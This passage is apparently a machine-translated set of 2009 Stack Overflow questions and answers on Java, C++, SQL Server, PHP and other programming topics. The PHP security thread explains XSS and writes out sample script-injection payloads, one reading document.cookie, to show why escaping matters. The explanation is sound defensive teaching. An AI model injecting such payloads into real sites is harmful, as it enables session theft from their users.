* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-03-16T18:03:00.827

我不知道任何示例，但 UITabelView 只是一个视图，因此可以是您想要的任何大小。您需要有一个从 UIViewController（而不是 UITableViewController）派生的视图控制器，但它实现了表视图的数据源和委托功能。

许多看起来像视图+表格（例如地址簿条目）的iPhone屏幕实际上只是具有自定义高度和内容的某些行的表格。

# java - 如何将 Swing 应用程序转换为 Applet？

> ID：651470
> 
> 赞同：4
> 
> 时间：2009-03-16T17:52:45.220
> 
> 标签：java, swing, applet, appframework, saf

我使用 Swing 应用程序框架创建了一个桌面应用程序，现在如何将其转换为小程序？主类扩展 SingleFrameApplication。

已编辑：这是起始类，使用了 NetBeans GUI 构建器：

```
public class PhotoApp extends SingleFrameApplication {

    /**
     * At startup create and show the main frame of the application.
     */
    @Override protected void startup() {
        show(new PhotoView(this));
    }

    /**
     * This method is to initialize the specified window by injecting resources.
     * Windows shown in our application come fully initialized from the GUI
     * builder, so this additional configuration is not needed.
     */
    @Override protected void configureWindow(java.awt.Window root) {
    }

    /**
     * A convenient static getter for the application instance.
     * @return the instance of PhotoUploaderApp
     */
    public static PhotoApp getApplication() {
        return Application.getInstance(PhotoApp.class);
    }

    /**
     * Main method launching the application.
     */
    public static void main(String[] args) {
        launch(PhotoApp.class, args);
    }
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-03-16T17:57:42.697

快速而肮脏的方式：

Drop 扩展 SingleFrameApplication。添加扩展 JApplet。

用 public void init() 替换构造函数，使主体保持原样。

创建一个 HTML 页面来保存它。试一试。

可能会有一些范围问题，但您应该能够相当容易地解决这些问题。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-03-16T17:55:32.703

最简单的事情就是创建一个从 JApplet 继承的新外部类，并在其中实例化实际的框架。

### 更新

在网上找到了一个可以帮助的[教程。](http://www.archive.org/details/ChrisThielJavaApplettoApplication)

# vb.net - 什么会导致表单失去与 MDI vb.net 项目中其父表单的链接？

> ID：651472
> 
> 赞同：0
> 
> 时间：2009-03-16T17:52:49.683
> 
> 标签：vb.net, winforms, mdi

非常周期性地，我们的 MDI vb.net 项目中的一些表单将返回 me.parent 为空。我在调试时从未见过这种情况，但它确实会在我们的客户端机器上导致未处理的异常——并且它们打开的形式因情况而异。

是否有任何类型的事件，除了“me.parent = nothing”，会导致这个链接被破坏？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-03-16T19:09:18.093

疯狂的用户。

看起来这是通过在打开新表单之前关闭当前表单来复制的。（就我而言，在生成报告时）小沙漏图标显然不够威慑。

# php - 现场安全扫描

> ID：651481
> 
> 赞同：0
> 
> 时间：2009-03-16T17:54:22.470
> 
> 标签：php, security, web-applications, xss

我最近对我工作的一个网站进行了安全审计。这是通过 Acunetix Web Vulnerability Scanner 完成的。这带来了一堆我正在整理的结果。

出现了很多关于 XSS 的点击，但我不确定它们是否是误报。

代码如：

```
if(isset($_GET['variableNameX']))
    $var_to_use_in_app = mysql_escape_string(trim($_GET['variableNameX'])); 
```

以对 XSS 开放的方式回归。任何带有查询字符串的页面是否会返回可能对 XSS 开放，或者它是否足够聪明，知道我正在处理这个服务器端？

谢谢您的帮助。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-03-16T17:58:37.890

如果有 HTML 传递给 querystring 参数，你会在页面上显示它吗？如果是这样，这不是误报。

换句话说，如果你通过有这样的东西： [http ://www.example.com/?myVar=Test](http://www.example.com/?myVar=Test)

并且您在页面上显示 myVar 的结果而无需测试 HTML/Script，那么有人可能会将其更改为： [http](http://www.example.com/?myVar=<b>Test</b&gt) ://www.example.com/?myVar=<b>Test</b> ；

或者类似的东西： [http](http://www.example.com/?myVar=<script>+doSomethingBad()+</script&gt) ://www.example.com/?myVar=<script>+doSomethingBad()+</script> ; （可能编码......但你明白了）

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2009-03-17T05:44:26.150

> $var_to_use_in_app = mysql_escape_string(trim($_GET['variableNameX']));

这通常是错误的做法。应用程序内部使用的字符串应始终是纯文本版本。然后你可以确定你的任何字符串操作都不会破坏它，并且你不会向页面输出错误的东西。

例如，如果您有提交的字符串：

```
O'Reilly 
```

mysql_escape_string 会将其转义为：

```
O\'Reilly 
```

当您将该字符串输出到 HTML 页面时，它看起来很傻。如果你把它输出到一个表单域，然后再次提交，你会得到*另一个*反斜杠，它会变成两个黑斜线，如果再次编辑会变成四个，八个......不久你就得到了由数百个反斜杠组成的字符串。这是在编写不佳的 CMS 和打开了 evil magic_quotes 功能的服务器中常见的问题。

然后，如果您想将名称的前两个字母放入数据库查询中，则可以剪切子字符串：

```
O\ 
```

然后将其连接到查询中：

```
SELECT * FROM users WHERE namefirst2='O\'; 
```

哎呀，语法错误，该字符串现在未终止。对预转义字符串进行字符串处理的变体同样容易让您陷入安全问题。

除了在最终输出阶段将它们连接成 SQL 或 HTML 中的定界文字外，您可以在应用程序中的任何地方将字符串作为简单的未转义文本字符串保存，而不是这种方法。对于 SQL：

```
"SELECT * FROM users WHERE name='".mysql_real_escape_string($name)."';" 
```

请注意“真实”函数名称——普通旧的 mysql_escape_string 对于东亚字符集和使用 ANSI SQL_MODE 集的连接/数据库等极端情况会失败，因此通常您应该始终使用“真实”版本。

您可以定义一个与 mysql_real_escape_string 相同但名称更短的函数（例如 m()），以使其不那么难看。或者，更好的是，查看 mysqli 的[参数化查询](http://de.php.net/manual/en/mysqli.prepare.php)。

对于 HTML，应该使用 htmlspecialchars() 函数进行转义：

```
<div id="greeting">
    Hello, Mr. <?php echo htmlspecialchars($name); ?>!
</div> 
```

您可以定义一个执行 echo(htmlspecialchars()) 但名称更短的函数（例如 h()），以使其不那么难看。

如果您错过了对 htmlspecialchars 的调用，那么您的扫描器绝对正确地告诉您您的网站易受 XSS 攻击。但不要觉得太糟糕，几乎所有其他 PHP 程序员都会犯同样的错误。

mysql_[real_]escape_string 在这里根本没有帮助，因为在 HTML 中从文本中分离出来的字符是 '&'、'<'，并且在属性中是 '"'。这些都不是特殊的SQL 字符串文字，所以 mysql_escape_string 根本不会触及它们。恶意：

```
<script>alert("I'm stealing your cookies! "+document.cookie);</script> 
```

只会逃到：

```
<script>alert("I\'m stealing your cookies! "+document.cookie);</script> 
```

就安全性而言，这没有任何帮助。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-03-18T13:28:04.523

Acunetix 是一个不错的工具，但它不能替代基于手动的应用程序渗透测试。它没有遵循潜在漏洞的逻辑......

它肯定在银行中使用，我在提案（已获批准）中推荐它来进行正式的工作。如果你有一个相当复杂的应用程序，它有很多动态生成的页面并且预算/时间是一个问题，你可以使用 Acunetix 或类似的工具来引导你指向应用程序潜在热点的方向。然后，您可以通过手动方式专注于这些领域 - 无论是手动测试还是逐步执行代码。这就是您的渗透测试机构赢得荣誉的地方。

客户根本没有资源彻底通过大型应用程序。

哦，请记住，有很多误报。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-03-16T17:57:48.813

我不知道具体的工具，但它不太可能“知道”您正在服务器端处理它，因为这需要在一般情况下解决等效问题。除此之外，该工具甚至可以访问您的 mysql 实例吗？它怎么知道？

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-03-16T19:44:28.307

我使用的很多工具都会返回误报。如果它正在审核实际代码，那么可能会返回一个潜在的漏洞，并且将 $_GET 或 $_POST 变量分配给正常变量，即使它稍后没有被打印出来。

为了安全起见，您应该检查所有内容并假设没有什么是误报。

# c++ - 如何在 C++ 中执行 std::string indexof 返回匹配字符串的索引？

> ID：651497
> 
> 赞同：24
> 
> 时间：2009-03-16T17:56:31.967
> 
> 标签：c++, string, stl

我正在从 std 命名空间中寻找一个字符串 indexof 函数，该函数返回一个匹配字符串的整数，类似于同名的 java 函数。就像是：

```
std::string word = "bob";
int matchIndex = getAString().indexOf( word ); 
```

其中 getAString() 定义如下：

```
std::string getAString() { ... } 
```

* * *

## 回答 #1

> 赞同：34
> 
> 时间：2009-03-16T17:58:23.273

试试这个[`find`](http://www.cppreference.com/wiki/string/find)功能。

这是我链接的文章中的示例：

```
 string str1( "Alpha Beta Gamma Delta" );
 string::size_type loc = str1.find( "Omega", 0 );
 if( loc != string::npos ) {
   cout << "Found Omega at " << loc << endl;
 } else {
   cout << "Didn't find Omega" << endl;
 } 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2009-03-16T18:03:44.103

从您的示例中不清楚您要在什么字符串中搜索“bob”，但这里是如何使用[find](http://www.cppreference.com/wiki/string/find)在 C++ 中搜索子字符串。

```
string str1( "Alpha Beta Gamma Delta" );
string::size_type loc = str1.find( "Omega", 0 );

if( loc != string::npos )
{
   cout << "Found Omega at " << loc << endl;
}
else
{
   cout << "Didn't find Omega" << endl;
} 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2009-03-16T18:01:09.303

您正在寻找`std::basic_string<>`函数模板：

```
size_type find(const basic_string& s, size_type pos = 0) const; 
```

这将返回索引，或者`std::string::npos`如果找不到字符串。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-03-16T18:01:13.327

我不确定您的示例是什么意思，但是对于 stl 字符串类，请查看[find](http://www.cplusplus.com/reference/string/string/find.html "寻找")和[rfind](http://www.cplusplus.com/reference/string/string/rfind.html "查找")

# internet-explorer - MediaPlayer 不显示控件 - Firefox 和 IE 的问题。如何解决？

> ID：651512
> 
> 赞同：0
> 
> 时间：2009-03-16T18:01:56.197
> 
> 标签：internet-explorer, firefox, streaming, windows-media-player

我得到了这段代码：

```
<object id="MMPlayer1"
codebase=http://activex.microsoft.com/activex/controls/mplayer/en/nsmp2inf.cab#Version=5,1,52,701
type=application/x-oleobject height=238 width=240 align=absmiddle
classid=CLSID:22d6f312-b0f6-11d0-94ab-0080c74c7e95>
<param name="FileName" value="http://www.abradio.cz/asx/beta32.asx">
<param name="ShowControls" value="1">
<param name="ShowStatusBar" value="0">
<param name="ShowDisplay" value="0">
<param name="DefaultFrame" value="Slide">
<param name=”PlayCount” value="1">
<param name="Autostart" value="1">
<embed
src="http://www.abradio.cz/asx/beta32.asx" width=240 height=238 autostart=1 loop=0
align="absmiddle" type="application/x-mplayer2"
pluginspage="http://www.microsoft.com/Windows/MediaPlayer/download/default.asp"
showcontrols=1 showdisplay=1 showstatusbar=0 > </embed></object> 
```

它似乎无法正常工作，因为“没有视频”显示。我宁愿显示自定义图像而不是它，或者控制面板暂停或停止流。任何人都可以帮助解决这个问题吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-03-16T19:41:35.317

您应该使用 Flash 播放器在所有主流浏览器中播放视频。您可以像使用 Windows Media Player 一样嵌入它。缺点是您无法使用 Flash 播放 ASX 文件，除非您首先将它们转换为 FLV 文件。[查看此网站以获取](http://kb.adobe.com/selfservice/viewContent.do?externalId=tn_4150)有关如何嵌入 Flash 播放器的信息。并[检查此](http://www.ffmpeg.org/)以将您的 Windows Media 文件转换为 Flash FLV 文件。它指向 FFMpeg，一个开源视频转换器。Windows的[可执行文件在这里](http://ffdshow.faireal.net/mirror/ffmpeg/)。

但要让您的视频在所有 IE 浏览器中播放，请执行以下操作：

一方面，视频没有显示，因为您使用“文件名”而不是“URL”来指向 URL。:-)

要播放“beta32.asx”文件，请删除以下行：

```
<param name="FileName" value="http://www.abradio.cz/asx/beta32.asx"> 
```

并将其替换为以下行：

```
<param name="URL" value="http://www.abradio.cz/asx/beta32.asx"> 
```

要从播放器中删除播放控件，请将“ShowControls”更改为“0”：

从：

```
<param name="ShowControls" value="1"> 
```

至：

```
<param name="ShowControls" value="0"> 
```

并[使用此处找到的示例](http://www.mioplanet.com/rsc/embed_mediaplayer.htm)来展示如何连接您自己的按钮来控制播放。它会要求你使用一些 JavaScript。

# multithreading - 在多线程环境中分析每个线程

> ID：651521
> 
> 赞同：1
> 
> 时间：2009-03-16T18:04:16.847
> 
> 标签：multithreading, winapi, mfc, profiling

有什么方法可以使用 MFC/Win32 找出 CPU 内部线程所花费的实际时间？通过实际时间，我的意思是我不想计算线程在“运行”以外的状态中花费的时间。我在 Win32 SDK 中尝试了 GetThreadTimes() 方法，但无法获得正确的值。我想这样做是因为我想检查设置 ThreadPriority 对其调度的影响，即如果我将线程优先级设置为 THREAD_PRIORITY_BELOW_NORMAL 而不是 THREAD_PRIORITY_NORMAL 会有多大的不同？

这是实际的代码：

```
#include<iostream>
#include <afxwin.h>
#include <afxmt.h>
#include <time.h>

bool bStop = false;
long k1 = 0;
long k2 = 0;

UINT run1(LPVOID param)
{
    while(!bStop)
    {
        for(int i = 0; i < 10; ++i)
        {
            ++k1;
        }
    }

    return 0;
}

UINT run2(LPVOID param)
{
    while(!bStop)
    {
        for(int i = 0; i < 10; ++i)
        {
            ++k2;
        }
    }

    return 0;
}

void main(int argc,char *argv[])
{

    CWinThread* pThread1 =  AfxBeginThread(&run1, NULL, THREAD_PRIORITY_NORMAL);
    CWinThread* pThread2 =  AfxBeginThread(&run2, NULL, THREAD_PRIORITY_BELOW_NORMAL );

    Sleep(3 * 1000);

    bStop = TRUE;

    FILETIME f1,f2,f3,f4;
    GetThreadTimes(*pThread1, &f1,&f2,&f3,&f4);
    CTime t1(f4);

    std::cout<<"K1="<<k1<<"\n";
    std::cout<<"K2="<<k2<<"\n";
    std::cout<<"Thread1 Time="<<t1.GetSecond()<<"sec\n";
    std::cout<<"Exit\n";
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-03-17T13:04:14.080

GetThreadTimes() 将为您提供正确的值。问题是它以 FILETIME 结构给出。您必须将 FILETIME 结构转换为易于向用户显示的时间。您可以使用 API [FileTimeToSystemTime](http://msdn.microsoft.com/en-us/library/ms724280(VS.85).aspx)来做到这一点：

```
SYSTEMTIME stUTC;        
FileTimeToSystemTime(&f4, &stUTC);
std::cout<<"Thread1: Hour:"<<stUTC.wHour<<" Min:"<<stUTC.wMinute<<" Sec:"<<stUTC.wSecond<<" millSec:"<<stUTC.wMilliseconds<<std::endl; 
```

在我的机器中，输出是：`Thread1: Hour:0 Min:0 Sec:3 millSec:0`

请忽略年\日详细信息，因为 FILETIME 包含一个 64 位值，表示自 1601 年 1 月 1 日 (UTC) 以来 100 纳秒间隔的数量。

不要忘记添加内核时间和用户时间以获得总时间。

# asp.net - 从程序集中复制 DLL 以进行部署

> ID：651522
> 
> 赞同：3
> 
> 时间：2009-03-16T18:04:17.267
> 
> 标签：asp.net, deployment, assemblies, gac

NET 在我的本地计算机上我有一个对本地程序集文件夹上的 DLL 的引用。我想知道如何在我的网站部署中“打包”这个 dll？当我在登台服务器上部署时，它开始抱怨它没有那个 dll。（它不在登台服务器的 GAC 中）。谢谢你。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-03-16T18:11:29.997

如果您引用的 DLL 不在目标计算机的 GAC 中，那么您应该将 DLL 放在您网站的`\bin`文件夹中。对于 asp.net 网站，引用的 DLL 必须存在于 GAC 或`\bin`文件夹中。或者，您可以使用 WebSetup 项目之类的工具将 DLL 安装到目标计算机的 GAC 中。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-03-16T18:08:56.430

您是否尝试将 DLL 引用设置为 CopyLocal = true？

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-03-16T18:10:28.127

Visual Studio 将引用位置保存为相对路径，因此将其放入项目中的 a 文件夹中，并确保其属性“复制本地”为 true，这将使 VS 将文件复制到输出目录。

# java - Java 编号比较

> ID：651523
> 
> 赞同：0
> 
> 时间：2009-03-16T18:04:37.283
> 
> 标签：java, startswith

有什么东西可以用来查看一个数字是否以与另一个数字相同的数字开头？前任。5643 和 5377 都以 5 开头。

有没有办法用数字来做到这一点，还是必须是字符串？（以。。开始？）

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2009-03-16T18:08:53.200

Ich n1 和 n2 是您的数字：

```
return (n1.toString().charAt(0) == n2.toString().charAt(0)); 
```

您将不得不使用 Integer 而不是 int，因为 int 没有 .toString() 方法。

如果 n1 是一个 int，你可以使用 new Integer(n1).toString()。

甚至更好（Bombe 建议）：

```
String.valueOf(n1).charAt(0) == String.valueOf(n2).charAt(0) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-03-16T18:09:31.937

递归除以十，直到整个除法小于十，然后那个数字是第一个，你可以比较数字。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-03-16T18:09:37.380

您可以计算第一个数字：

```
public int getFirstDigit(int number) {
    while (number >= 10) {
        number /= 10;
    }
    return number;
} 
```

（这仅适用于正数。）

但话又说回来，您可以只比较字符串表示的第一个字符。字符串比较可能会比较慢，但由于您的问题是“获取字符串表示的第一个字符”，它可能只是合适的解决方案。:)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-03-16T18:13:42.737

最直接的方法（允许不同的长度值）可能就像你说的那样，将它们都转换为字符串。

```
int x = 5643;
int y = 5377;
String sx, sy;

sx = "" + x;        // Converts int 5643 to String "5643"
sy = "" + y;

boolean match = (sx.charAt(0) == sy.charAt(0)); 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-03-16T18:21:56.493

```
 public static byte firstDigit(int number) {
    while (true) {
      int temp = number / 10;

      if (temp == 0) {
        return (byte) Math.abs(number);
      }

      number = temp;
    } 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2009-03-16T20:20:37.860

(int)(a / 10 ** (int)Math.log10(a))

可能比字符串解决方案效率低，但没有循环，它使我们保持在“数字”领域。

（永远记住，当您谈论数字中的位数时，log10 是您的朋友）

也不适用于负数 - 取第一个的绝对值。

* * *

## 回答 #7

> 赞同：-1
> 
> 时间：2009-03-17T10:42:32.033

对于整数，int n1 和 int n2；

```
return ("" + n1).charAt(0) == ("" + n2).charAt(0); 
```

# sql-server - 在 MS SQL Server 中检测列更改的最有效方法

> ID：651524
> 
> 赞同：26
> 
> 时间：2009-03-16T18:05:26.953
> 
> 标签：sql-server, tsql, sql-server-2008, sql-server-2000, performance

我们的系统在 SQL Server 2000 上运行，我们正在为升级到 SQL Server 2008 做准备。我们有很多触发器代码，我们需要检测给定列中的更改，然后在该列上进行操作已经改变。

显然，SQL Server 提供了[UPDATE()](http://msdn.microsoft.com/en-us/library/ms187326.aspx)和[COLUMNS_UPDATED()](http://msdn.microsoft.com/en-us/library/ms186329.aspx)函数，但这些函数只告诉您 SQL 语句中涉及了哪些列，**而不是**实际更改了哪些列。

要确定哪些列已更改，您需要类似于以下的代码（对于支持 NULL 的列）：

```
IF UPDATE(Col1)
    SELECT @col1_changed = COUNT(*) 
    FROM Inserted i
        INNER JOIN Deleted d ON i.Table_ID = d.Table_ID
    WHERE ISNULL(i.Col1, '<unique null value>') 
            != ISNULL(i.Col1, '<unique null value>') 
```

需要为您有兴趣测试的每一列重复此代码。然后，您可以检查“更改”值以确定是否执行昂贵的操作。当然，这段代码本身是有问题的，因为它只告诉你列中至少有一个值在所有被修改的行上发生了变化。

您可以使用以下内容测试单个 UPDATE 语句：

```
UPDATE Table SET Col1 = CASE WHEN i.Col1 = d.Col1 
          THEN Col1 
          ELSE dbo.fnTransform(Col1) END
FROM Inserted i
    INNER JOIN Deleted d ON i.Table_ID = d.Table_ID 
```

...但是当您需要调用存储过程时，这不起作用。据我所知，在这些情况下，您必须依靠其他方法。

我的问题是，是否有人对在触发器中预测数据库操作的问题的最佳/最便宜的方法是什么有洞察力（或者更好的是硬数据），即修改行中的特定列值是否实际发生了变化或不是。以上两种方法似乎都不理想，我想知道是否存在更好的方法。

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2009-03-16T22:46:11.630

让我们从我永远不会开始，我的意思是永远不会在触发器中调用存储过程。要考虑多行插入，您必须通过 proc 游标。这意味着您刚刚通过基于集合的查询（例如将所有价格更新 10%）加载的 200,000 行可能会将表锁定几个小时，因为触发器会勇敢地尝试处理负载。另外，如果 proc 发生变化，您可以完全破坏表中的任何插入，甚至完全挂起表。我坚信触发器代码不应该在触发器之外调用任何东西。

就个人而言，我更喜欢简单地完成我的任务。如果我在触发器中编写了我想要正确执行的操作，它只会更新、删除或插入列已更改的位置。

示例：假设您想要更新您存储在两个地方的 last_name 字段，因为出于性能原因在此处放置了非规范化。

```
update t
set lname = i.lname
from table2 t 
join inserted i on t.fkfield = i.pkfield
where t.lname <>i.lname 
```

如您所见，它只会更新与我正在更新的表中当前不同的 lname。

如果您想进行审核并仅记录那些更改的行，则使用所有字段进行比较，例如 where i.field1 <> d.field1 或 i.field2 <> d.field3 （通过所有字段等）

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2014-09-02T15:16:35.393

我认为您可能想使用 EXCEPT 运算符进行调查。它是一个基于集合的运算符，可以清除未更改的行。好消息是，将空值视为相等，因为它在 EXCEPT 运算符之前列出的第一个集合中而不是在 EXCEPT 之后列出的第二个集合中查找行

```
WITH ChangedData AS (
SELECT d.Table_ID , d.Col1 FROM deleted d
EXCEPT 
SELECT i.Table_ID , i.Col1  FROM inserted i
)
/*Do Something with the ChangedData */ 
```

这处理了允许 Null 而不`ISNULL()`在触发器中使用的列的问题，并且只返回对 col1 进行更改的行的 id，以提供一种基于良好集合的方法来检测更改。我还没有测试过这种方法，但它可能值得你花时间。我认为 SQL Server 2005 引入了 EXCEPT。

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2009-03-27T13:59:42.507

尽管 HLGEM 在上面给出了一些很好的建议，但这并不是我所需要的。在过去的几天里，我做了很多测试，我想我至少会在这里分享结果，因为看起来不会有更多信息出现。

我设置了一个表，它实际上是我们系统的一个主表的一个更窄的子集（9 列），并用生产数据填充它，使其与我们的表的生产版本一样深。

然后我复制了该表，并在第一个表上编写了一个触发器，该触发器试图检测每个单独的列更改，然后根据该列中的数据是否实际更改来预测每个列的更新。

对于第二个表，我编写了一个触发器，该触发器使用广泛的条件 CASE 逻辑对单个语句中的所有列进行所有更新。

然后我进行了 4 个测试：

1.  对单行的单列更新
2.  单列更新到 10000 行
3.  对单行的九列更新
4.  九列更新到 10000 行

我对表的索引版本和非索引版本重复了这个测试，然后在 SQL 2000 和 SQL 2008 服务器上重复了整个测试。

我得到的结果相当有趣：

第二种方法（在 SET 子句中有一个带有毛茸茸 CASE 逻辑的单个更新语句）比单个更改检测的性能更好（取决于测试或多或少），唯一的例外是单列更改影响列索引的许多行，在 SQL 2000 上运行。在我们的特殊情况下，我们不会像这样进行许多狭窄、深度的更新，因此对于我的目的而言，单语句方法绝对是要走的路。

* * *

我很想听听其他人对类似类型测试的结果，看看我的结论是否像我怀疑的那样普遍，或者它们是否特定于我们的特定配置。

为了让你开始，这是我使用的测试脚本——你显然需要想出其他数据来填充它：

```
create table test1
( 
    t_id int NOT NULL PRIMARY KEY,
    i1 int NULL,
    i2 int NULL,
    i3 int NULL,
    v1 varchar(500) NULL,
    v2 varchar(500) NULL,
    v3 varchar(500) NULL,
    d1 datetime NULL,
    d2 datetime NULL,
    d3 datetime NULL
)

create table test2
( 
    t_id int NOT NULL PRIMARY KEY,
    i1 int NULL,
    i2 int NULL,
    i3 int NULL,
    v1 varchar(500) NULL,
    v2 varchar(500) NULL,
    v3 varchar(500) NULL,
    d1 datetime NULL,
    d2 datetime NULL,
    d3 datetime NULL
)

-- optional indexing here, test with it on and off...
CREATE INDEX [IX_test1_i1] ON [dbo].[test1] ([i1])
CREATE INDEX [IX_test1_i2] ON [dbo].[test1] ([i2])
CREATE INDEX [IX_test1_i3] ON [dbo].[test1] ([i3])
CREATE INDEX [IX_test1_v1] ON [dbo].[test1] ([v1])
CREATE INDEX [IX_test1_v2] ON [dbo].[test1] ([v2])
CREATE INDEX [IX_test1_v3] ON [dbo].[test1] ([v3])
CREATE INDEX [IX_test1_d1] ON [dbo].[test1] ([d1])
CREATE INDEX [IX_test1_d2] ON [dbo].[test1] ([d2])
CREATE INDEX [IX_test1_d3] ON [dbo].[test1] ([d3])

CREATE INDEX [IX_test2_i1] ON [dbo].[test2] ([i1])
CREATE INDEX [IX_test2_i2] ON [dbo].[test2] ([i2])
CREATE INDEX [IX_test2_i3] ON [dbo].[test2] ([i3])
CREATE INDEX [IX_test2_v1] ON [dbo].[test2] ([v1])
CREATE INDEX [IX_test2_v2] ON [dbo].[test2] ([v2])
CREATE INDEX [IX_test2_v3] ON [dbo].[test2] ([v3])
CREATE INDEX [IX_test2_d1] ON [dbo].[test2] ([d1])
CREATE INDEX [IX_test2_d2] ON [dbo].[test2] ([d2])
CREATE INDEX [IX_test2_d3] ON [dbo].[test2] ([d3])

insert into test1 (t_id, i1, i2, i3, v1, v2, v3, d1, d2, d3)
-- add data population here...

insert into test2 (t_id, i1, i2, i3, v1, v2, v3, d1, d2, d3)
select t_id, i1, i2, i3, v1, v2, v3, d1, d2, d3 from test1

go

create trigger test1_update on test1 for update
as
begin

declare @i1_changed int,
    @i2_changed int,
    @i3_changed int,
    @v1_changed int,
    @v2_changed int,
    @v3_changed int,
    @d1_changed int,
    @d2_changed int,
    @d3_changed int

IF UPDATE(i1)
    SELECT @i1_changed = COUNT(*) FROM Inserted i INNER JOIN Deleted d
        ON i.t_id = d.t_id WHERE ISNULL(i.i1,0) != ISNULL(d.i1,0)
IF UPDATE(i2)
    SELECT @i2_changed = COUNT(*) FROM Inserted i INNER JOIN Deleted d
        ON i.t_id = d.t_id WHERE ISNULL(i.i2,0) != ISNULL(d.i2,0)
IF UPDATE(i3)
    SELECT @i3_changed = COUNT(*) FROM Inserted i INNER JOIN Deleted d
        ON i.t_id = d.t_id WHERE ISNULL(i.i3,0) != ISNULL(d.i3,0)
IF UPDATE(v1)
    SELECT @v1_changed = COUNT(*) FROM Inserted i INNER JOIN Deleted d
        ON i.t_id = d.t_id WHERE ISNULL(i.v1,'') != ISNULL(d.v1,'')
IF UPDATE(v2)
    SELECT @v2_changed = COUNT(*) FROM Inserted i INNER JOIN Deleted d
        ON i.t_id = d.t_id WHERE ISNULL(i.v2,'') != ISNULL(d.v2,'')
IF UPDATE(v3)
    SELECT @v3_changed = COUNT(*) FROM Inserted i INNER JOIN Deleted d
        ON i.t_id = d.t_id WHERE ISNULL(i.v3,'') != ISNULL(d.v3,'')
IF UPDATE(d1)
    SELECT @d1_changed = COUNT(*) FROM Inserted i INNER JOIN Deleted d
        ON i.t_id = d.t_id WHERE ISNULL(i.d1,'1/1/1980') != ISNULL(d.d1,'1/1/1980')
IF UPDATE(d2)
    SELECT @d2_changed = COUNT(*) FROM Inserted i INNER JOIN Deleted d
        ON i.t_id = d.t_id WHERE ISNULL(i.d2,'1/1/1980') != ISNULL(d.d2,'1/1/1980')
IF UPDATE(d3)
    SELECT @d3_changed = COUNT(*) FROM Inserted i INNER JOIN Deleted d
        ON i.t_id = d.t_id WHERE ISNULL(i.d3,'1/1/1980') != ISNULL(d.d3,'1/1/1980')

if (@i1_changed > 0)
begin
    UPDATE test1 SET i1 = CASE WHEN i.i1 > d.i1 THEN i.i1 ELSE d.i1 END
    FROM test1
        INNER JOIN inserted i ON test1.t_id = i.t_id
        INNER JOIN deleted d ON i.t_id = d.t_id
    WHERE i.i1 != d.i1
end

if (@i2_changed > 0)
begin
    UPDATE test1 SET i2 = CASE WHEN i.i2 > d.i2 THEN POWER(i.i2, 1.1) ELSE POWER(d.i2, 1.1) END
    FROM test1
        INNER JOIN inserted i ON test1.t_id = i.t_id
        INNER JOIN deleted d ON i.t_id = d.t_id
    WHERE i.i2 != d.i2
end

if (@i3_changed > 0)
begin
    UPDATE test1 SET i3 = i.i3 ^ d.i3
    FROM test1
        INNER JOIN inserted i ON test1.t_id = i.t_id
        INNER JOIN deleted d ON i.t_id = d.t_id
    WHERE i.i3 != d.i3
end

if (@v1_changed > 0)
begin
    UPDATE test1 SET v1 = i.v1 + 'a'
    FROM test1
        INNER JOIN inserted i ON test1.t_id = i.t_id
        INNER JOIN deleted d ON i.t_id = d.t_id
    WHERE i.v1 != d.v1
end

UPDATE test1 SET v2 = LEFT(i.v2, 5) + '|' + RIGHT(d.v2, 5)
FROM test1
    INNER JOIN inserted i ON test1.t_id = i.t_id
    INNER JOIN deleted d ON i.t_id = d.t_id

if (@v3_changed > 0)
begin
    UPDATE test1 SET v3 = LEFT(i.v3, 5) + '|' + LEFT(i.v2, 5) + '|' + LEFT(i.v1, 5)
    FROM test1
        INNER JOIN inserted i ON test1.t_id = i.t_id
        INNER JOIN deleted d ON i.t_id = d.t_id
    WHERE i.v3 != d.v3
end

if (@d1_changed > 0)
begin
    UPDATE test1 SET d1 = DATEADD(dd, 1, i.d1)
    FROM test1
        INNER JOIN inserted i ON test1.t_id = i.t_id
        INNER JOIN deleted d ON i.t_id = d.t_id
    WHERE i.d1 != d.d1
end

if (@d2_changed > 0)
begin
    UPDATE test1 SET d2 = DATEADD(dd, DATEDIFF(dd, i.d2, d.d2), d.d2)
    FROM test1
        INNER JOIN inserted i ON test1.t_id = i.t_id
        INNER JOIN deleted d ON i.t_id = d.t_id
    WHERE i.d2 != d.d2
end

UPDATE test1 SET d3 = DATEADD(dd, 15, i.d3)
FROM test1
    INNER JOIN inserted i ON test1.t_id = i.t_id
    INNER JOIN deleted d ON i.t_id = d.t_id

end

go

create trigger test2_update on test2 for update
as
begin

    UPDATE test2 SET
        i1 = 
            CASE
            WHEN ISNULL(i.i1, 0) != ISNULL(d.i1, 0)
            THEN CASE WHEN i.i1 > d.i1 THEN i.i1 ELSE d.i1 END
            ELSE test2.i1 END,
        i2 = 
            CASE
            WHEN ISNULL(i.i2, 0) != ISNULL(d.i2, 0)
            THEN CASE WHEN i.i2 > d.i2 THEN POWER(i.i2, 1.1) ELSE POWER(d.i2, 1.1) END
            ELSE test2.i2 END,
        i3 = 
            CASE
            WHEN ISNULL(i.i3, 0) != ISNULL(d.i3, 0)
            THEN i.i3 ^ d.i3
            ELSE test2.i3 END,
